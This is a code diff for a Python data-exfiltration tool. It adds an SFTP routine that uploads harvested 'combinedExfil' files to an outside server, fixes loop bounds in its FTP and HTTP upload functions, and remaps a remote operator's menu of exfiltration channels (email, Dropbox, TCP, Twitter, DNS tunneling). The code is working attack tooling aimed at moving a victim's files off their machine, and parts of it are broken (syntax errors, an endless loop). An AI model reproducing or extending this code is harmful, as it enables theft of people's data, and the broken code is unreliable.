@@ -188,6 +188,30 @@ def victimTCP():
     soc.close()
 def extensionchange():
     wavT=open("x")
+def SFTP():
+    port = 2222
+    hostname="demo.wftpserver.com"
+    try:
+        tunnel=paramiko.SSHClient()
+        key = paramiko.RSAKey.generate(1024)
+        tunnel = paramiko.Transport((hostname, port))
+        tunnel.connect(username='demo-user', password="demo-user") #this test server seems to have an issue with the RSAKey generated, thus it is not being used
+        sftp = paramiko.SFTPClient.from_transport(tunnel)
+        fnum=1
+        if flg!=1:
+            while fnum<=numExfilFiles:
+                sftp.put(gpath+"\\X"+str(fnum)+"combinedExfil.txt", "upload/X"+str(fnum)+"combinedExfil.txt")
+                fnum+=1
+                print(success)
+        if flg==1:
+            while fnum<=numExfilFiles:
+                success=sftp.put(gpath+"\\X"+str(fnum)+"combinedExfil.png", "upload/X"+str(fnum)+"combinedExfil.png")
+                print(success)
+                fnum+=1
+        tunnel.close()
+    except Exception as e:
+        print(e)
+        tunnel.close()
 def maildata():
     global numBytes, numExfilFiles, numFiles, dT, eD, gpath, flg
     #Works but add cycling through the file and sending the contents
@@ -386,13 +410,13 @@ def FTPTransferOnline(): #This also assumes it will go out in txt file format, w
     session.retrlines('LIST')     # list directory contents
     fnum=1
     if flg!=1:
-        while fnum<numExfilFiles:
+        while fnum<=numExfilFiles:
             session.cwd('upload')   # you can upload file in upload dir on the server
             file= open(gpath+"\\X"+str(fnum)+"combinedExfil.txt",'rb')  # file to be uploaded
             session.storbinary(gpath+"\\X"+str(fnum)+"combinedExfil.txt",file)
             fnum+=1
     if flg==1:
-        while fnum<numExfilFiles:
+        while fnum<=numExfilFiles:
             session.cwd('upload')   # you can upload file in upload dir on the server
             file= open(gpath+"\\X"+str(fnum)+"combinedExfil.txt",'rb')  # file to be uploaded
             session.storbinary("STOR "+gpath+"\\X"+str(fnum)+"combinedExfil.png",file)
@@ -435,13 +459,13 @@ def HttpTunnel():
     remoteFilename = "X"+str(fnum)+"combinedExfil.txt")
     fnum=1
     if flg!=1:
-        while fnum<numExfilFiles:
+        while fnum<=numExfilFiles:
             localFilename = (gpath+"\\X"+str(fnum)+"combinedExfil.txt")
             remoteFilename = "X"+str(fnum)+"combinedExfil.txt")
             ftp.PutFile(localFilename,remoteFilename)
             fnum+=1
     if flg==1:
-        while fnum<numExfilFiles:
+        while fnum<=numExfilFiles:
             localFilename = (gpath+"\\X"+str(fnum)+"combinedExfil.png")
             remoteFilename = "X"+str(fnum)+"combinedExfil.png")
             ftp.PutFile(localFilename,remoteFilename)
@@ -462,13 +486,13 @@ def FTPTransfer():
     session.retrlines('LIST')     # list directory contents
     fnum=1
     if flg!=1:
-        while fnum<numExfilFiles:
+        while fnum<=numExfilFiles:
             session.cwd('upload')   # you can upload file in upload dir on the server
             file= open(gpath+"\\X"+str(fnum)+"combinedExfil.txt",'rb')  # file to be uploaded
             session.storbinary(gpath+"\\X"+str(fnum)+"combinedExfil.txt",file)
             fnum+=1
     if flg==1:
-        while fnum<numExfilFiles:
+        while fnum<=numExfilFiles:
             session.cwd('upload')   # you can upload file in upload dir on the server
             file= open(gpath+"\\X"+str(fnum)+"combinedExfil.txt",'rb')  # file to be uploaded
             session.storbinary("STOR "+gpath+"\\X"+str(fnum)+"combinedExfil.png",file)
@@ -479,7 +503,7 @@ def FTPTransfer():
 def keepAsIs():
     global numExfilFiles, numFiles, dT, eD,gpath
     currentFile=0
-    while currentFile<numFiles:
+    while currentFile<=numFiles:
         shutil.copy2(source, gpath+"\\X"+str(currentFile)+"combinedExfil.txt")
     numExfilFiles=numFiles
 
@@ -499,30 +523,27 @@ def exfiltrationMethod(s,fname,spaces):
     global numBytes, numExfilFiles, numFiles, dT, eD, gpath
     path=gpath
 
-    if eD==0:
-        dataTransformationMethod(path,s,fname,spaces)
-        maildata()
     if eD==1:
         dataTransformationMethod(path,s,fname,spaces)
-        dropBox()
+        maildata()
     if eD==2:
         dataTransformationMethod(path,s,fname,spaces)
-        victimTCP()
+        dropBox()
     if eD==3:
         dataTransformationMethod(path,s,fname,spaces)
-        FTPTransferOnline()#Client to ftpserver to Serverside
+        victimTCP()
     if eD==4:
         dataTransformationMethod(path,s,fname,spaces)
-        FTPTransfer()#client to serverside direct
+        FTPTransferOnline()#Client to ftpserver to Serverside
     if eD==5:
-        #SFTP
-        sftp=5
+        dataTransformationMethod(path,s,fname,spaces)
+        FTPTransfer()#client to serverside direct
     if eD==6:
         dataTransformationMethod(path,s,fname,spaces)
-        victimUDP()
+        SFTP()
     if eD==7:
-        tbd=7
-        #DNS?
+        dataTransformationMethod(path,s,fname,spaces)
+        victimUDP()
     if eD==8:
         dataTransformationMethod(path,s,fname,spaces)
         TwitterExfil()
@@ -532,6 +553,8 @@ def exfiltrationMethod(s,fname,spaces):
     if eD==10:
         dataTransformationMethod(path,s,fname,spaces)
         HttpTunnel()
+    if eD==11:
+        DnsQueries()
 def putTogether(s, numFilesC, pathOr):
     counterFile=0
     global numBytes, numExfilFiles, numFiles, dT, eD, gpath
@@ -796,7 +819,7 @@ Def Start():
             tunnel.send(key.encode("utf-8"))
     if tunnel.recv(1024).decode("utf-8")=="et":
         print("1-Email, 2-dropBox, 3-TCP, 4-FTP Online(Using an external server to upload to and then download from), 5-FTP Transfer")
-        print("6-SFTP Tunneling, 7-UDP, 8-Twitter, 9-SSH Tunneling, 10-HTTPS Tunneling, 11-HTTP")
+        print("6-SFTP, 7-UDP, 8-Twitter, 9-SSH Tunneling, 10-HTTP Tunneling, 11-DNS tunneling(A DNS server needs to be set up along with dns logging. Modifications to how sub-domains are dealt with may be required)")
         eT=input("Enter a data exfilteration method of your liking (1-11)")
         tunnel.send(eT)
     tunnel.send((input("Enter a search term")).encode("utf-8"))
